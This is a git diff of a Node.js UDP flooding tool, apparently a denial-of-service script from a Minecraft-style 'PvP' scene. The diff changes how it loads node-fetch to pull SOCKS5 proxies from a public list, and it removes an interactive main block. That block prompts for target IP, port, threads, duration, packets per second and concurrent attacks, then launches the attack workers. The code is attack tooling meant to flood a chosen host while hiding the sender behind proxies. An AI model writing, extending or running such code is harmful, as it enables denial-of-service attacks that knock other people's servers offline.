@@ -1,6 +1,5 @@
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const dgram = require('dgram');
-const fetch = require('node-fetch');
 const readline = require('readline');
 const chalk = require('chalk');
 
@@ -29,7 +28,8 @@ Owner : iTzDarkoPvP - v1.0.0
 
 // Función para obtener proxies
 const getProxys = async () => {
-    const response = await fetch('https://proxylist.geonode.com/api/proxy-list?limit=30&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks5');
+    const nodeFetch = await import('node-fetch');
+    const response = await nodeFetch.default('https://proxylist.geonode.com/api/proxy-list?limit=30&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks5');
     const data = await response.json();
     return data.data;
 };
@@ -131,28 +131,3 @@ const iniciarReceiver = (port = 0) => {
     client.bind(port);
 };
 
-// Ejecución principal
-if (isMainThread) {
-    const rl = readline.createInterface({
-        input: process.stdin,
-        output: process.stdout
-    });
-
-    rl.question(chalk.greenBright('[~] Ingresar IP: '), (address) => {
-        rl.question(chalk.greenBright('[~] Ingresar porta: '), (port) => {
-            rl.question(chalk.greenBright('[~] Ingresar threads: '), (threads) => {
-                rl.question(chalk.greenBright('[~] Ingresar tempo (em minutos): '), (time) => {
-                    rl.question(chalk.greenBright('[~] Ingresar PPS (Pacotes por segundo): '), (pps) => {
-                        rl.question(chalk.greenBright('[~] Ingresar ataques concurrentes: '), (concurrentes) => {
-                            iniciarAtaque(address, port, threads, time, pps, concurrentes);
-                            iniciarReceiver(port);
-                            rl.close();
-                        });
-                    });
-                });
-            });
-        });
-    });
-} else {
-    handleWorkerMessage(workerData);
-}
